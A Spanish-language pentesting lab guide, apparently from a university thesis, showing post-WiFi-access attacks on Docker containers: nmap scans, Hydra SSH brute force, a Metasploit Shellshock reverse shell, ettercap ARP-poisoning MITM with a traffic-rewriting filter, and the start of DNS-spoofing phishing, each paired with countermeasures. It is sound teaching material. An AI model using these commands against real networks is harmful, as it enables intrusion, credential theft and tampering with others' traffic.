# Ataques Tras el Acceso a la Red

Tras romper el protocolo WEP (o cualquiera de los que se estudiarán a continuación) y conseguir acceso a la red interna, un atacante podría realizar múltiples acciones maliciosas. En este apartado se mostrarán algunos ejemplos de ataques que pueden surgir una vez dentro de la red. Esto sirve para concienciar sobre la importancia de la seguridad y cómo un atacante puede dañar a una organización con el simple hecho de tener acceso a su red interna.

`Nota:` Se recomienda probar estos ataques tras completar cada uno de los ataques que dan acceso a la red WLAN, haciendo las pruebas con los ficheros de la rama de dichos ataques que consiguen acceso a la red WiFi.

### Escaneo de red

Una vez se consigue el acceso a la red, lo primero que se puede probar es un escaneo para intentar visualizar los dispositivos cercanos con los que ahora convive la máquina atacante. Para ello se usa el afamado comando `nmap`, en primera instancia para localizar todas las máquinas activas en la red. Pero antes se debe conocer la red en la que se encuentra la máquina; para ello se conecta la máquina atacante y se solicita una IP mediante DHCP:
```
docker-compose exec attacker-1 bash 
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
ifconfig          # Ver la connexión establecida
```
![image](https://github.com/user-attachments/assets/95d52a52-00b6-4976-b54f-37ddb59cc163)

Como se ve, la máquina atacante se encuentra en `10.5.2.128/26`, lo cual a priori parece una red bastante pequeña. Suponiendo que realmente la red es más grande, se puede escanear mejor la red `10.5.2.0/24` (no conviene que sea mucho mayor por la sobrecarga excesiva que supone):
```
nmap -sn 10.5.2.0/24
```
* `-sn`: escaneo mediante ping (detectar máquinas activas)

![image](https://github.com/user-attachments/assets/3ba0e58d-f10f-44a3-bce7-c58a510e944b)

Además, se puede escanear la red `10.5.1.0/24`, ya que al contener servidores públicos su dirección IP es conocida y accesible desde fuera; por tanto, resulta interesante visualizar qué máquinas se levantan en esta red y ver si hay alguna más que no se vea desde fuera:
```
nmap -sn 10.5.1.0/24
```
![image](https://github.com/user-attachments/assets/40cfd951-4b0e-4dd7-8e69-29b23fdb58f8)

Por último, se procede a escanear ambas redes en mayor profundidad, buscando los servicios que expone cada máquina levantada:
```
nmap -p- -sV 10.5.2.0/24 10.5.1.0/24
```
- `-p-`: analiza todos los puertos.  
- `-sV`: detecta versiones de los servicios en los puertos abiertos.

![image](https://github.com/user-attachments/assets/7e0ee857-2b1e-4b0a-a3f8-bf1386b404a7)
![image](https://github.com/user-attachments/assets/d52c95a2-c686-4af1-86c7-e7271e9c965a)
![image](https://github.com/user-attachments/assets/9c915b4b-a6e6-42c9-a7d0-314815b3b2ee)
![image](https://github.com/user-attachments/assets/fd1afc99-c82d-48d6-a3e0-086a79efbe01)

Aquí se detectan varias cuestiones interesantes que se visualizarán en los siguientes ataques o pruebas.

### Aprovechar privilegios en la red interna

En primer lugar, se visualizan los posibles accesos a los servidores que expone la organización; de forma que, consiguiendo acceso SSH, se podría llegar a insertar algún tipo de malware en la web o redirigir a los usuarios a una red controlada por el atacante que robe credenciales, por ejemplo. Para intentar estos cambios se podría probar una conexión SSH con contraseñas y usuarios típicos como `root:root`:
```
ssh root@10.5.1.20
ssh root@10.5.1.21 -p 2222 # Se aprecia este puerto sospechoso
```
![image](https://github.com/user-attachments/assets/76e3261c-58ef-4dab-9212-20f7f6c4cdd8)

En uno de los casos esta contraseña falla (las credenciales de DMZ2 en realidad son `carlos:passw0rd1234` y no `root:root`, pero esto el atacante lo desconoce). Sin embargo, al acceder a DMZ1 se permite dicha conexión exclusivamente por estar dentro de la red interna (se puede comprobar desde la máquina `external` que esta conexión no está permitida). 

![image](https://github.com/user-attachments/assets/7fe041ec-0a62-421b-90cb-290deb63d803)

Esto se debe a que la regla de firewall que limita el acceso de administración a los servidores simplemente tiene en cuenta que los usuarios que intentan dicho acceso se encuentren dentro de la red interna:
```
iptables -A FORWARD -s 10.5.0.0/24 -d 10.5.1.20 -p tcp --dport 22 -j ACCEPT          # Redirect to Cowrie external SSH to DMZ1
iptables -A FORWARD -s 10.5.2.0/24 -d 10.5.1.20 -p tcp --dport 22 -j ACCEPT          # Allow all internal network to admin dmz servers
iptables -A FORWARD -s 10.5.2.0/24 -d 10.5.1.21 -p tcp --dport 2222 -j ACCEPT
```

Para ver los efectos que esto podría tener, se puede acceder a `/usr/local/apache2/htdocs/`, donde se encuentra el archivo `index.html` que muestra la página principal de la web, y cambiar el texto principal por otro mensaje. Una vez se guardan los cambios, se puede comprobar esta variación desde la máquina `external` que representa a un usuario cualquiera de Internet:
```
# Ataque
docker-compose exec attacker-1 bash
ssh root@10.5.1.20
# Comprobacion desde una máquina legítima
docker-compose exec external bash
curl 10.5.2.20
```
![image](https://github.com/user-attachments/assets/fd3cebff-e89b-401b-8933-17d3cbbd6e0a)

![image](https://github.com/user-attachments/assets/2d51b67c-c820-416c-8667-398bce04f81c)

Aquí se ve que ya no se muestra el mensaje original —“Hola! Soy el servidor conocido como DMZ1”— sino uno alterado por el atacante: “Hola!, soy el atacante que se ha apoderado de este servidor”. Esto supone un peligro importante, pues se puede aprovechar este acceso para modificar cualquier recurso web, llegando incluso a introducir malware descargable por los usuarios o redirecciones a sitios controlados por dicho atacante.

#### Contramedidas y recomendaciones

Algunas opciones que pueden frenar este ataque comienzan por limitar las máquinas que pueden establecer esa comunicación SSH a través de reglas `iptables` en el firewall (`fw`):
```
docker-compose exec fw bash
# Borrado de reglas antiguas
iptables -L FORWARD --line-numbers # Buscar numero de la regla antigua (solo cadena FORWARD)
iptables -D FORWARD 10 # Borrar regla antigua por numero (primero la de mayor indice)
iptables -D FORWARD 9  # Borrar regla antigua por numero de linea
# Instauración de nuevas reglas
iptables -A FORWARD -s 10.5.2.22 -d 10.5.1.20 -p tcp --dport 22 -j ACCEPT            
iptables -A FORWARD -s 10.5.2.22 -d 10.5.1.21 -p tcp --dport 2222 -j ACCEPT 
iptables -A FORWARD -s 10.5.2.23 -d 10.5.1.20 -p tcp --dport 22 -j ACCEPT            
iptables -A FORWARD -s 10.5.2.23 -d 10.5.1.21 -p tcp --dport 2222 -j ACCEPT 
```
![image](https://github.com/user-attachments/assets/cf48542c-e60c-4954-911a-ac9cf218b8ca)

Con esto se limita a las máquinas `10.5.2.23` (internal-4) y `10.5.2.22` (internal-3) el acceso de administración a los servidores de la DMZ. Esto se debe a que establecer una máquina cableada y con IP fija, como int4 es algo más común y controlado. Además, se añade una segunda máquina cableada con estos permisos debido a que recibe y enmascara la comunicación segura mediante VPN.

Ejemplos de comprobación:
```
# Probar conexion desde int4
docker-compose exec internal-4 bash (funciona)
ssh root@10.5.1.20
ssh root@10.5.1.21 -p 2222

# Probar conexion desde int 1 (falla)
docker-compose exec internal-1 bash
ssh root@10.5.1.20
ssh root@10.5.1.21 -p 2222

# Probar conexion desde VPN (con la maquina externa, funciona)
docker-compose exec external bash
openvpn --config /etc/openvpn/client.conf  # Conexion mediante VPN
ssh root@10.5.1.20
ssh root@10.5.1.21 -p 2222

# Probar conexion desde el atacante (falla)
docker-compose exec attacker-1 bash
ssh root@10.5.1.20
ssh root@10.5.1.21 -p 2222
```

Con esto, el atacante desde la red inalámbrica no puede conectarse aun conociendo las credenciales, ya que aunque cambie su IP, esta será enmascarada por el punto de acceso antes de llegar a la red interna. Además, se da acceso a cualquier máquina que conozca las credenciales de la VPN (confiando en que se distribuyan de forma segura en la organización), lo cual establece una comunicación segura con la máquina `int3` que luego se enmascara con la IP de origen de esa máquina, permitiendo así la comunicación SSH con los servidores de la DMZ. Esto se puede hacer incluso desde otros dispositivos de la red interna que a priori no tengan ese acceso (aunque en este laboratorio solo se prueba desde `ext1`, el único que cuenta con la configuración cliente de la VPN).

Otra contramedida ya instaurada de primeras es la redirección de la conexión SSH del puerto 22 (por defecto) proveniente de la red externa hacia una trampa (([`Honeypot`](https://github.com/Carlosdm06/TFG-Pentesting/tree/config#honeypot))) que la máquina DMZ1 contiene en el puerto 2222, simulando un servidor falso. Estos efectos se ven cuando se intenta la conexión desde la máquina externa sin usar la VPN y, por tanto, sin acceso legítimo a la administración de los recursos de la DMZ.

### Romper SSH (fuerza bruta)

Si no se tienen en cuenta las medidas adoptadas para paliar el ataque anterior, se puede intentar romper credenciales SSH, lo cual podría dar acceso incluso a DMZ1 que antes no se consiguió (cuenta cincredenciales más robustas). En primer lugar, se debe establecer la conexión con la máquina atacante al punto de acceso WiFi:
```
docker-compose exec attacker-1 bash 
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
```

Una vez dentro de la red y conociendo los detalles de esta gracias al [escaneo](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks#escaneo-de-red), se puede proceder a romper la contraseña de cualquiera de los servidores DMZ. Esto se hace con la herramienta [`Hydra`](https://www.kali.org/tools/hydra/) de Kali Linux, que permite ataques de diccionario (probar muchas opciones registradas en ficheros `.txt`, por ejemplo). Para ello, se necesitan diccionarios que, en este caso, han sido tomados de proyectos públicos y reducidos para el laboratorio; aunque en entornos reales se debe usar listas más completas y adaptadas al ataque concreto (buscando en Internet, por ejemplo):

- [`ssh_passwords.txt`](https://github.com/jeanphorn/wordlist/blob/master/ssh_passwd.txt): contraseñas típicas de SSH.
- [`ssh_usernames.txt`](https://github.com/jeanphorn/wordlist/blob/master/usernames.txt): nombres de usuario típicos de SSH.

Con estos diccionarios (ya dentro de la máquina atacante), se puede iniciar el ataque de fuerza bruta contra el servidor DMZ1 (se comineza con este, pero se verá como funciona con ambos), ya que sabemos que sus credenciales son débiles:
```
hydra -L ssh_usernames.txt -P ssh_passwords.txt -t 4 -s 22 ssh://10.5.1.20
```
* `-L ssh_usernames.txt`: indicar nombre que se desean probar
* `-P ssh_passwords.txt`: indicar contraseña que pribar por cada nombre
* `-t 4`: ejecutar 4 procesos en paralelo (opcional pero consigue la contraseña más rápido)
* `-s 22`: especificar puerto (opcional si es el por defecto)
* `ssh://10.5.1.20`: URL que indica la IP de la máquina víctima
![image](https://github.com/user-attachments/assets/d6b5629b-f274-4d6c-a6aa-1055f6de4a40)

Como era de esperar, se aprecia que en este servidor se capturan fácilmente las credenciales "root:root". Haciendo lo mismo para el servidor DMZ2 (recordadno que este se expone en el puerto 2222) se obtiene también un resultado exitoso capturando las credenciales "carlos:passw0rd1234", las cuales no son muy robustas y por eso se logran:
```
hydra -L ssh_usernames.txt -P ssh_passwords.txt -t 4 -s 2222 ssh://10.5.1.21
```
![image](https://github.com/user-attachments/assets/121bc6c8-314a-457d-8592-f4ca4a03aea0)

#### Contramedidas y Recomendaciones
Estos aspectos adversos se pueden frenar de varias maneras. En primer lugar, con lo visto anteriormente: limitar los usuarios que pueden establecer la conexión SSH desde el firewall. Esto es una muy buena opción, ya que protege los servidores aun con una contraseña débil, lo cual sería ideal combinar con la otra opción: establecer credenciales más robustas. En este segundo caso, se puede probar a construir algunas credenciales robustas y ejecutar el ataque de nuevo para comprobar que la fuerza bruta ya no será suficiente. Para esta prueba se puede alterar el fichero [`Dockerfile`](https://github.com/Carlosdm06/TFG-Pentesting/blob/Attacks/dmz/dmz2/Dockerfile) de DMZ2 para cambiar el usuario `carlos:passw0rd1234` por otro más robusto, por ejemplo, `carlos:d9Z!m@4rQ#LfT$2xNp`. Tras esto se para el laboratorio y se vuelve a iniciar con los cambios realizados:

![image](https://github.com/user-attachments/assets/981ab074-dd1a-4cb3-9ca6-bfcfe8a6c500)
```
sudo ./stop.sh
sudo ./launch.sh
```
Y ejecutando el ataque de nuevo se comprueba que ya no es posible obtener las credenciales:
```
hydra -L ssh_usernames.txt -P ssh_passwords.txt -t 4 -s 2222 ssh://10.5.1.21
```
![image](https://github.com/user-attachments/assets/eec24245-2a26-4c14-bae2-55cb3a9a4d13)

Como se ha visto, usar credenciales robustas siempre es una opción muy buena, siendo aún más recomendable la conexión exclusiva por clave pública/privada. Este tipo de conexión se puede probar desde las máquinas `int1` e `int2` (antes de reducir las máquinas con acceso SSH a los servidores DMZ) mediante el comando:
```
ssh -i .ssh/id_rsa -o IdentitiesOnly=yes -p 2222 carlos@10.5.1.21 # Clave "1234" del id_rsa
```
![image](https://github.com/user-attachments/assets/3a379677-81a8-4634-a8f6-22ebe17a0d26)

Donde `.ssh` es el directorio que almacena las claves necesarias.

Además, ya se ha visto otra contramedida como la trampa que tiende el servidor DMZ1 cuando un usuario externo intenta conectar. DMZ2 cuenta con otras opciones recomendadas de autenticación más robusta. En primer lugar, el servicio [`fail2ban`](https://github.com/Carlosdm06/TFG-Pentesting/tree/config#dmz2) que banea las IPs de aquellos usuarios que hacen demasiados intentos de conexión. Para poder probar sus efectos, se debe modificar [`start.sh`](https://github.com/Carlosdm06/TFG-Pentesting/blob/Attacks/dmz/dmz2/start.sh) para descomentar la línea que lo inicia:

![image](https://github.com/user-attachments/assets/63597629-9473-460d-b449-24997cb1ce4c)

Tras esto (y tras relanzar el laboratorio), se recomienda volver a ejecutar el ataque para comprobar que ahora la IP del atacante es baneada y no puede seguir la ejecución de este. Además, se recomienda hacerlo con una clave débil para comprobar que el ataque se ha frenado gracias a este baneo:

```
hydra -L ssh_usernames.txt -P ssh_passwords.txt -t 4 -s 2222 ssh://10.5.1.21
```
![image](https://github.com/user-attachments/assets/318933eb-4444-4d94-9904-b4bcf8aca413)

Otra posibilidad para frenar este tipo de ataques es el doble factor de autenticación, lo cual requiere de alguna aplicación extra como "Google Authenticator" (es la que usaremos) para generar un código temporal que se debe introducir aparte de la contraseña. Para activarlo basta con descomentar las líneas del [`Dockerfile`](https://github.com/Carlosdm06/TFG-Pentesting/blob/Attacks/dmz/dmz2/Dockerfile) de DMZ2 que lo activan:

![image](https://github.com/user-attachments/assets/9d5617e5-1bcb-4862-bb41-30f94dee051a)

Tras esto se recomienda relanzar el laboratorio y el ataque, de forma que ahora no funciona el ataque al necesitar esos códigos temporales inaccesibles para la herramienta de ataque:

```
hydra -L ssh_usernames.txt -P ssh_passwords.txt -t 4 -s 2222 ssh://10.5.1.21
```
![image](https://github.com/user-attachments/assets/145c4ce3-1364-404e-8900-aa7e820d292c)

`Nota:` Para usar el doble factor de autenticación se debe instalar Google Authenticator e introducir el código `ZQNGC4KR6UF3AGKUP6H6XCUICY` asociado al servidor DMZ2, para que así poder obtener los códigos temporales.

Como se puede apreciar, hay muchas formas de reforzar la seguridad de SSH, pero se recomienda encarecidamente combinar varias de estas medidas, ya que no son excesivamente intrusivas en la usabilidad y proporcionan un gran nivel de protección, especialmente cuando se combinan.

### Ataque con Metasploit
Una vez se limita el acceso SSH a los servidores de la DMZ, una opción de ataque es apoderarse primero de una máquina de administración. Suponiendo que no se consigue esto mediante un SSH débil (aunque en verdad cualquiera de las máquinas autorizadas lo tiene), pasemos a intentar otro tipo de ataques. Aunque no se vea realmente reflejado en el [escaneo de redes](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks#escaneo-de-red), la vulnerabilidad "GNU Bash Remote Code Execution", popularmente conocida como [`ShellShock`](https://github.com/Carlosdm06/TFG-Pentesting/blob/config/README.md#shellshock), se ve reflejada en el puerto 80 abierto en la máquina `10.5.2.23` (visible en el [escaneo de redes](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks#escaneo-de-red)). Con esto se busca atacar la vulnerabilidad [`CVE-2014-6271`](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2014-6271).

Una forma común de actuar ante una máquina vulnerable, la cual se descubre con `nmap`, es buscar en Internet exploits para los servicios vulnerables que expone (se puede visualizar esto gracias al servicio y versión descubierto con opciones como `-sV`). En este curso se utiliza la conocida base de datos de exploits, [`Metasploit`](https://github.com/Carlosdm06/TFG-Pentesting/tree/config#metasploitable3), lo cual es muy satisfactorio gracias a su consola de trabajo, `msfconsole`:
```
docker-compose exec attacker-1 bash 
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
# Arrancar la consola metasploit
msfconsole
```
Una vez arrancada se puede buscar el exploit idóneo para nuestra labor con el comadno `search`:
```
# Buscar por CVE
search cve:2014-6271
# Buscar por nombre (tambien puede ser puerto u otro parametro que concida)
search shellshock
```
![image](https://github.com/user-attachments/assets/b2ea8a06-b5e8-446d-8b4f-336d971ff388)
![image](https://github.com/user-attachments/assets/b3988a24-26e2-4198-a7c7-d88253bf8a29)

Con esto se aprecian varias opciones de exploits o varias versiones de cada uno de estos; se busca seleccionar la más adecuada para el caso particular. De esta forma, si la información no es suficiente, se puede obtener más detalle de cada módulo con:
```
info <linea-del-exploit>
```
![image](https://github.com/user-attachments/assets/854ea0a4-6408-48c3-b4e4-5c9cbcffa668)
![image](https://github.com/user-attachments/assets/be526b56-346e-41d8-b3e1-a7aa93e81fb6)

Aquí se muestra en detalle todo lo requerido por el exploit para funcionar (en este caso se está escogiendo el segundo exploit por ser más acorde al servidor Apache de int4), así como una descripción extensa del exploit. En este caso en particular interesa seleccionar la opción que no especifica el sistema operativo de la máquina víctima, ya que lo desconocemos. Para comenzar el ataque, se usa:
```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```
Junto al comando:
```
show options
```
![image](https://github.com/user-attachments/assets/ec8006e6-ed5a-4460-b7ae-834004c20d03)
![image](https://github.com/user-attachments/assets/3a444f41-f1ec-432f-923d-b2a3848a38bf)

Que permite visualizar las opciones configurables que se imprimieron anteriormente con `info`. Aquí se debe usar el comando:
```
set <nombre-opcion> <valor>
```
Para modificar las que se crean convenientes según el ataque que se quiera lanzar. En el caso de este ataque se puede configurar de la siguiente manera (la URI "/cgi-bin/vulnerable" se especifica en el Docker Hub de la imagen [`vulnerable`](/cgi-bin/vulnerable)):
![image](https://github.com/user-attachments/assets/6d942896-9d0e-4b0e-9bd2-ab0c73383a74)
![image](https://github.com/user-attachments/assets/19bf0d02-b051-4cc8-b13a-ecf427012dc1)

Por otro lado, también se puede seleccionar el tipo de payload, es decir, la acción que se realiza cuando se consigue romper el servicio atacado. Para nuestro objetivo de conseguir un acceso remoto basta con la shell reversa (ya seleccionado, aunque si se desea usar otro se aconseja volver a comprobar dicha selección tras dicha acción). Básicamente lo que se hace en este payload es conseguir que la víctima se conecte a un proceso nuestro, el cual sirve para enviarle órdenes a la víctima como si fuera una comunicación SSH con esta.
```
# Ver los payloads disponibles
show payloads
# Cambiar el payload
set payload 8 # Una shell reverse para de metasploitable 
```
![image](https://github.com/user-attachments/assets/9b1388cc-444c-4362-8188-04f0acba07f1)
![image](https://github.com/user-attachments/assets/4683c763-fa84-42e6-b714-d0ba1387e092)
![image](https://github.com/user-attachments/assets/786726b4-078f-4641-a14f-22b2fd2051a3)

Finalmente, se lanza el ataque con:
```
exploit
```
![image](https://github.com/user-attachments/assets/4652d9eb-7977-4dc8-9ad9-71971acce36b)
![image](https://github.com/user-attachments/assets/93e20644-5173-484e-8ad8-2af95e3954cc)

Con este se puede visualizar como hemos logrado conseguir el control de una máquina con permisos de acceso SSH (lo ideal es obtener las credenciales para volvernos a conectar legítimamente con SSH) a los servidores de la DMZ (tras el endurecimientos de las reglas iptables sobre esta cuestión). Con lo cual, las [contramedidas relativas al primer ataque](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks#contramedidas-y-recomendaciones) habrían sido sobrepasadas, consiguiendo de nuevo acceso a las máquinas de la DMZ (a no ser que se implementen la del segundo ataque) junto a todos los problemas comentados anteriormente que esto acarrea

`Nota: ` La máquina `client-3` contiene varios servicios vulnerables al tratarse de una máquina [`Metasploitable3`](https://github.com/Carlosdm06/TFG-Pentesting/tree/config#metasploitable3), con lo que se recomienda encarecidamente probar más ataques como el aquí explicado, tanto con `msfconsole` como con una búsqueda en Internet de los servicios expuestos y sus vulnerabilidades.

#### Contramedidas y Recomendaciones
De esta forma, las contramedidas del primer ataque no serían de gran utilidad al controlar una máquina que sigue teneindo acceso, aunque tampoco tiene sentido restringir aún más estos accesos. Una opción que como mínimo puede complicarselo a los atacantes, son las [contramedidas relativas al segundo ataque](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks#contramedidas-y-recomendaciones-1), las cuales dificultan el conocimeinto de las credenciales. Sin embargo, es muy posible que la máquina víctima (en este caso int3) cuente con la clave privada (de un sistema de autenticación basado en clave pública), lo cual le da acceso también a esta clave al atacante, el cual puede intentar romper su clave de protección para conseguir acceso. 

Por tanto, la opción más recomendable es evitar que las máquinas conectadas a la red interna sean atacadas. Este ataque fue paliado por la gente de Microsoft con un parche, el cual se podía hacer efectivo mediante la actualización de Windows. Con esto se ve la importancia de las actualizaciones en cuanto a la seguridad, parcheando fallos que hacen vulnerables a las máquinas. De forma que la mejor solución para evitar estas vulnerabilidades es la continua actualización de las máquinas usadas, así como evitar exponer servicios que realmente no se usen. También es conveniente que las empresas u organizaciones, en especial las que manejan datos personales, hagan de vez en cuando alguna auditoria de seguridad para encontrar estas vulnerabilidades y poder ponerles solución antes de que las encuentre un ciberdelincuente.

### MITM con Mensajes en Claro
Ahora, se pasa a una visión totalmente distinta, el objetivo ya no es alterar la página web ofrecida por la empresa víctima, sino que se trata del robo de información en claro. Para ello, se empieza con la conexión tanto a una máquina de la red interna (da igual que sea cableada o no), junto a la conexión a la máquina atacante en otra terminal:
```
# Terminal cliente (se puede usar cualquier cliente WLAN)
docker-compose exec client-1 bash 
# Terminal atacante
docker-compose exec attacker-1 bash
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
```
De esta forma se usará la máquina cliente para generar el tráfico que se robará y la máquina atacante para conseguir extraer esta información. En primer lugar, se prepara el ataque con `nmap` como se hizo anteriormente, donde se vio que la IP de uno de los servidores es `10.5.2.20` (se puede hacer lo mismo con el otro) y la IP de la máquina víctima (con la que nos conectamos) es `10.5.1.130` (también se puede usar cualquier otra máquina de la red interna inalámbrica). Sin embargo, este tipo de ataque solo es posible en el área de red local, donde realmente se usa el protocolo ARP (capa de enlace). Por tanto, no se ataca directamente la IP del servidor víctima, sino que se obtiene el tráfico entre la víctima (`10.5.1.130`) y el punto de acceso (`10.5.2.129`), pudiendo interferir así cualquier comunicación del cliente víctima.

Ahora se arranca la herramienta `ettercap` para empezar un ataque ARP Poisoning, que consiste en envenenar las caches ARP con la intención de redirigir el tráfico entre el punto de acceso y la víctima para que pase por el atacante:

![image](https://github.com/user-attachments/assets/76f4c508-e999-4004-abb7-d354796dedc1)  
![image](https://github.com/user-attachments/assets/52327631-db0e-4709-a172-b71e68c608fc)

```
# Hay tráfico que atravesará al atacante, se debe activar el bit de forwarding para permitirlo
echo 1 > /proc/sys/net/ipv4/ip_forward
# Usar ettercap
ettercap -T -M arp:remote /10.5.2.129// /10.5.2.130//
```
- `-T`: usar modo texto (sin GUI).  
- `-M arp:remote`: MITM mediante envenenamiento remoto de caches ARP (víctima y punto de acceso).  
- `/10.5.2.129//`: objetivo 1, punto de acceso.  
- `/10.5.2.130//`: objetivo 2, cliente WLAN.

`Nota:` en sistemas con GUI la herramienta es más intuitiva.

**HTTP:**  
Atacante (captura tráfico HTTP en claro):
![image](https://github.com/user-attachments/assets/88621de6-c23c-4c3a-aea2-fc2c7c331940)  
![image](https://github.com/user-attachments/assets/1f586f13-f488-4180-979d-a7a6bde1166b)  
![image](https://github.com/user-attachments/assets/a7e4fb68-45e1-4619-aa31-6310164fa784)  
![image](https://github.com/user-attachments/assets/29923c40-8695-481f-baa7-40ca714556ee)  
![image](https://github.com/user-attachments/assets/fff0de5a-6baf-48ce-bfd5-47dacaa325c0)

Cliente (ve la página normalmente):
![image](https://github.com/user-attachments/assets/483af281-f855-4d54-9808-3d91069eb70f)

**Telnet (ejemplo):**


```
# Permitir momentaneamente conexion al puerto 2222
# de dmz1 con objeto de probar comunicaciones telnet
docker-compose exec fw bash
iptables -A FORWARD -s 10.5.2.0/24 -d 10.5.1.20 -p tcp --dport 2223 -j ACCEPT
```
**Atacante (captura Telnet en claro):**
![image](https://github.com/user-attachments/assets/e477e3ec-6872-4156-a3e4-50d09bf27644)  
![image](https://github.com/user-attachments/assets/21b9d32e-93d9-47fe-9f00-598d200cf347)  
![image](https://github.com/user-attachments/assets/1b13fafc-7a74-4e9a-a5b5-f2717f33cb19)  
![image](https://github.com/user-attachments/assets/fe75006e-ae95-43ab-a722-8ea9655c85c5)

**Cliente:**
![image](https://github.com/user-attachments/assets/3ed115bb-9a6c-490d-80bd-e77a2e67b707)

Con esto se demuestra cómo este ataque permite ver cualquier información en texto plano del cliente atacado (tanto al ir hacia Internet como en la WLAN la información pasa por el punto de acceso). Además, este tipo de ataques permite la modificación de la información que pasa por medio del atacante; para ello se usan los filtros de Ettercap, que son ficheros de configuración que permiten seleccionar la información que se visualiza o la que se desea alterar y cómo hacerlo:
```
nano http_replace.ef
```
```
if (ip.proto == TCP && search(DATA.data, "DMZ")) {   # Buscar DMZ dentro de paquetes HTTP (en realizar cualquier paquete TCP que contenga "DMZ")
    log(DATA.data, "/tmp/http_dmz_replace.log");                      # Registrar los cambios
    replace("DMZ", "HCK");                                            # Reemplazar contenido
    msg("HTTP modificado: DMZ → HCK\n");                              # Mensaje mostrado por consola al momento del cambio
}
```
Este filtro se puede guardar como `http_replace.ef` para posteriormente ser validado con la herramienta `etterfilter` de Ettercap:
```
# Validación y construcción del filtro
etterfilter http_replace.ef -o http_replace.efilter
```
![image](https://github.com/user-attachments/assets/76182992-9cb1-4a25-b98b-68bcedc5dba9)

Con todo configurado, se ejecuta de nuevo Ettercap con objeto de realizar un MITM mediante envenenamiento ARP, añadiendo este filtro para conseguir alterar la información tal y como se deseaba:
```
ettercap -T -q -F http_replace.efilter -T -M arp:remote /10.5.2.129// /10.5.2.130//
```
- `-q`: modo silencioso (solo muestra mensajes imprescindibles).  
- `-F http_replace.efilter`: añadir el filtro creado para la modificación de mensajes.

**Atacante (modificaciones visibles):**
![image](https://github.com/user-attachments/assets/7788c4cd-fb08-4a34-88f3-2f3c0e9d72b9)  
![image](https://github.com/user-attachments/assets/0ae02b1f-c446-4448-b35d-d921639ce67c)

**Cliente (ve el contenido modificado sin saberlo):**
![image](https://github.com/user-attachments/assets/02832982-9ad9-44a4-a986-d76b1a079a70)

Finalmente se aprecia cómo el ataque resulta exitoso, permitiendo la modificación de mensajes de manera transparente tanto para el cliente como para el punto de acceso. Esto es realmente peligroso, ya que no solo sirve para robar contraseñas, sino que podría alterar mensajes cruciales que los empleados comparten en una red que creen segura. Además, si esto se suma al [ataque con Metasploit](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks#ataque-con-metasploit) donde se consigue control de alguna máquina con mayores permisos o en otro segmento de red, el potencial del ataque se extiende fuera de la red inalámbrica.

#### Contramedidas y Recomendaciones
La mayor contramedida para paliar los efectos de un MITM es el uso de protocolos que cifran el tráfico transmitido: HTTPS en lugar de HTTP, SSH en lugar de Telnet, etc. Si la comunicación está cifrada correctamente, el atacante no podrá leer ni modificar los datos (salvo que consiga romper o suplantar los mecanismos de cifrado, lo cual es complejo para estos protocolos mencionados de la capa de aplicación).

Ejemplo de comprobación:
```
# Lanzar el ataque
docker-compose attacker-1 fw bash
ettercap -T -M arp:remote /10.5.2.129// /10.5.2.130//

# Mensajes cifrados en el cliente
docker-compose exec client-1 bash
curl -k https://10.5.1.21        # Evitar la comprobacion del certificado (con tenemos CA)
ssh root@10.5.1.20               # Credenciales root:root
```
**Atacante:**
![image](https://github.com/user-attachments/assets/9bb11df7-4546-4877-b1e8-667df71247ec)
![image](https://github.com/user-attachments/assets/df8d1fb8-1ff4-4e83-b906-e902c40834b1)
![image](https://github.com/user-attachments/assets/d12d8ca6-1b3c-4193-b5c9-888c21dede07)
![image](https://github.com/user-attachments/assets/462c1e28-dbac-42e9-b118-11eb4427904e)
![image](https://github.com/user-attachments/assets/a01d17d1-678c-4b2a-8f34-cbfca22f3bc5)
![image](https://github.com/user-attachments/assets/faab7936-f58d-405b-93a8-a3a646476561)

**Cliente:**
![image](https://github.com/user-attachments/assets/8cda1517-71f8-4a04-b6c0-46a07e620e71)

Y por consiguiente, tampoco se puede alterar el contenido:
```
ettercap -T -q -F http_replace.efilter -T -M arp:remote /10.5.2.129// /10.5.2.130//
```
**Atacante (no muestra haber completado la modificación, no detecta la información debido al cifrado):**
![image](https://github.com/user-attachments/assets/01ca1f49-aade-468e-9b30-b59332cd639d)
![image](https://github.com/user-attachments/assets/0213ce76-2ea2-40de-ad0a-2b6ebc19a059)

**Cliente:**
![image](https://github.com/user-attachments/assets/8bbb4db5-951e-40d8-afb3-29a9c7678e33)

Con esto se prueba una sencilla forma de paliar problemas del tipo MITM: usar protocolos que cifren la información. Sin embargo, hay que asegurarse de que las versiones de los protocolos de cifrado que usan otros protocolos como SSH o HTTPS, sean las más recientes posibles, o al menos una que se considere segura. Esto es debido a que muchos de estos protocolos están rotos en sus versiones más antiguas, recalcando nuevamente la importancia de mantener la tecnología actualizada.


### DNS Spoofing para Robo de Credenciales
Por último, se realiza un ataque que sigue en la misma línea y que tiene como objetivo el robo de credenciales, aún si se usan servicios cifrados como HTTPS. Este ataque consiste en usar de nuevo `ettercap` en combinación con S.E.T. ([Social Engineering Toolkit](https://nexoscientificos.vidanueva.edu.ec/index.php/ojs/article/view/40/163)), una herramienta de Kali Linux que ayuda en la realización de ataques de ingeniería social, entre ellos el clonado de páginas web legítimas que tengan procesos de autenticación. De esta forma, la idea es clonar la página de login y, mediante DNS spoofing, redirigir al usuario al clon para capturar las credenciales.

Realmente lo que sucederá es que el cliente no encontrará en su caché DNS local el dominio usado (`carlos.web.com`) y hará una petición DNS externa; el atacante, con un MITM, podrá capturar esa petición y devolver la IP de un servidor suyo:

![image](https://github.com/user-attachments/assets/eac6c4eb-22d8-4d18-bdc7-d713f9d3a6e2)

En concreto, se desea clonar la web que publica el servidor externo con IP `10.5.0.20`:

![image](https://github.com/user-attachments/assets/ceea2422-2bf6-47a1-9452-aae48eff4a80)

Esta labor se puede hacer con `setoolkit` de S.E.T., que muestra una consola interactiva para elegir la técnica de ingeniería social:
```
